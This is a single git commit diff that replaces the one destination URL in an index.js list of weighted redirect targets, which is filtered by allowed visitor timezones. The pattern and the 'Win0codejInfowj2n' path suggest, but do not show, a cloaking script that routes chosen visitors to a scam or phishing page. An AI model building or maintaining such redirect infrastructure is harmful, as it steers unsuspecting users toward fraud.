16479213131a317ed9af704e91e507368fe62708
paalakash <palaksh452@gmail.com>
2026-07-11 12:12:27 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://9nbgchg.z20.web.core.windows.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://urchin-app-ytzlh.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
